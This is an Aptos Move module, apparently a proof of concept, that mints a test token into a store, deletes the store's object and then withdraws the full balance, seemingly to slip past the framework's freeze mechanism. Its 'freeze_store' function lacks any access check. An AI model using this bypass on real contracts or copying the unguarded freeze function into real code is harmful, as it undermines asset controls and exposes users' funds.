module fungible_asset_bypass::bypass {
    use std::signer;
    use std::string;
    use std::option;
    use std::object::{Self, Object, DeleteRef, ExtendRef};
    use aptos_framework::fungible_asset::{Self, MintRef, BurnRef, TransferRef, FungibleStore, Metadata};
    use aptos_framework::primary_fungible_store;

    struct DeleteRefStore has key {
        delete_ref: DeleteRef,
    }

    struct StoreObjectReference has key {
        store_ref: Object<FungibleStore>,
        extend_ref: ExtendRef
    }

    struct FungibleAssetRefs has key {
        mint_ref: MintRef,
        burn_ref: BurnRef,
        transfer_ref: TransferRef,
        token: Object<Metadata>
    }

    fun init_module(account: &signer) {
        let constructor_ref = object::create_named_object(account, b"BYPASS_TOKEN_SEED");
        primary_fungible_store::create_primary_store_enabled_fungible_asset(
            &constructor_ref,
            option::none(),
            string::utf8(b"BYPASS TEST TOKEN"),
            string::utf8(b"BFA"),
            8,
            string::utf8(b""),
            string::utf8(b""),
        );
        move_to(account, FungibleAssetRefs {
            mint_ref: fungible_asset::generate_mint_ref(&constructor_ref),
            burn_ref: fungible_asset::generate_burn_ref(&constructor_ref),
            transfer_ref: fungible_asset::generate_transfer_ref(&constructor_ref),
            token: object::object_from_constructor_ref(&constructor_ref),
        });
    }

    #[view]
    public fun get_token(): Object<Metadata> acquires FungibleAssetRefs {
        FungibleAssetRefs[@fungible_asset_bypass].token
    }

    #[view]
    public fun get_bypass_store_address(user_addr: address): address {
        object::create_object_address(&user_addr, b"BYPASS_FA_STORE")
    }

    public entry fun mint_to_with_bypass(account: &signer) acquires FungibleAssetRefs {
        let constructor_ref = object::create_object(signer::address_of(account));
        let user_store = fungible_asset::create_store(&constructor_ref, get_token());
        fungible_asset::mint_to(&FungibleAssetRefs[@fungible_asset_bypass].mint_ref, user_store, 100_000_000);
        move_to(account, StoreObjectReference{ store_ref: user_store, extend_ref: object::generate_extend_ref(&constructor_ref) });
        move_to(account, DeleteRefStore{ delete_ref: object::generate_delete_ref(&constructor_ref) });
    }

    public entry fun enable_bypass(account: &signer) acquires DeleteRefStore {
        let DeleteRefStore{ delete_ref } = move_from(signer::address_of(account));
        object::delete(delete_ref);
    }

    public entry fun withdraw_with_bypass(account: &signer) acquires StoreObjectReference {
        let StoreObjectReference{ store_ref, extend_ref } = move_from(signer::address_of(account));
        let store_signer = object::generate_signer_for_extending(&extend_ref);
        let tokens = fungible_asset::withdraw(&store_signer, store_ref, fungible_asset::balance(store_ref));
        primary_fungible_store::deposit(signer::address_of(account), tokens);
    }

    public entry fun freeze_store(store_address: address) acquires FungibleAssetRefs {
        let store_obj = object::address_to_object<FungibleStore>(store_address);
        let transfer_ref = &FungibleAssetRefs[@fungible_asset_bypass].transfer_ref;
        fungible_asset::set_frozen_flag(transfer_ref, store_obj, true);
    }

        // let metadata = mint_ref.metadata;
        // let constructor_ref = object::create_object(signer::address_of(creator));
        // {
        //     let creator_store = create_store(&constructor_ref, metadata);
        //     let delete_ref = object::generate_delete_ref(&constructor_ref);
        //     object::delete(delete_ref);
        //     move_to(creator, StoreObjectReference{creator_store});
        // };
        // let creator_store = StoreObjectReference[signer::address_of(creator)].creator_store;
        // let store_addr = object::address_from_constructor_ref(&constructor_ref);
        // // let creator_store = object::object_address[signer::address_of(creator)].creator_store;
        // let creator_store = object::address_to_object<FungibleStore>(store_addr);
        // set_frozen_flag(&transfer_ref, creator_store, true);
        // assert!(is_frozen(creator_store));
}
